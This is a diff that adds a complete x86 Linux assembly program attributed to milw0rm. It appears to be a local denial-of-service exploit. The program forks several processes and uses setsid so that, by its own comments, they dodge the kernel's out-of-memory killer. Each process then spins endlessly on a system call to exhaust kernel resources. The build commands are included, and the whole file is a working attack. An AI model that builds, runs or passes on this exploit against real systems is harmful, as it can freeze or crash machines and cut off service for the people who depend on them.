@@ -1,0 +1,44 @@
+;nasm -f elf noHeaven.asm
+;ld -s -o noHeaven noHeaven.o
+
+section .text
+   global _start
+
+count   equ     8       ; threads count - do it quicker
+
+_start:
+       mov     ebx, count
+       call    create_threads
+       jmp     done
+_pause:
+       mov     eax,29
+       int     0x80
+       ret
+create_threads:
+       mov     eax,2
+       int     0x80
+       test    eax,eax
+       jz      consume
+       dec     ebx
+       test    ebx,ebx
+       jnz     create_threads
+       ret
+consume:
+setsid:         ;       so we won't get counted as one thread in oom_killer()
+       xor     ebx,ebx ;       each task will have about 20 oom_score which
+       mov     eax,66 ;        is less than 'init' and others
+       int     0x80
+       push    eax
+loopek:
+       mov     eax,259
+       mov     ebx,0
+       mov     ecx,0
+       mov     edx,esp
+       int     0x80
+       jmp     loopek
+done:
+       xor     ebx,ebx
+       mov     eax,1
+       int     0x80
+
+; milw0rm.com [2006-04-09]
